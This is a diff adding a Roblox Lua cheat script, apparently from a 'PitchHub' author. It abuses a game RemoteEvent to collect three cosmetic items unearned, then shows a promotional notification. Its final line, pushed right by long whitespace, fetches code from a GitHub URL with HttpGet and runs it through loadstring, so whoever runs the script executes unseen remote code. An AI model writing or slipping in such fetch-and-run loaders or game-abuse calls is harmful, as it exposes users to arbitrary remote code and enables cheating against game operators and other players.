@@ -1,0 +1,30 @@
+game:GetService("ReplicatedStorage").RemoteEvent:FireServer("CollectItem","Shady Circle Glasses")
+
+print("i1 done")
+
+wait(0.01)
+
+game:GetService("ReplicatedStorage").RemoteEvent:FireServer("CollectItem","Sunshine Backpack")
+
+print("i2 done")
+
+wait(0.01)
+
+game:GetService("ReplicatedStorage").RemoteEvent:FireServer("CollectItem","Tie-Dye Visor")
+
+print("i3 done")
+
+wait(0.01)
+
+                                                                                            
+                                                                                            game.StarterGui:SetCore("SendNotification", {
+                                                             Title = "PitchHub"; -- the title (ofc)
+                                                             Text = "Thank for using my scripts , sub for more"; -- what the text says (ofc)
+                                                             Icon = "rbxassetid://7900788535"; -- the image if u want. 
+                                                             Duration = 60; -- how long the notification should in secounds
+                                                             })
+                                                             
+                                                             
+                                                             wait(0.5)
+                                                             
+                                                             loadstring(game:HttpGet('https://raw.githubusercontent.com/PitchyATree/hub-loading/main/taiverdes2%5C2'))()
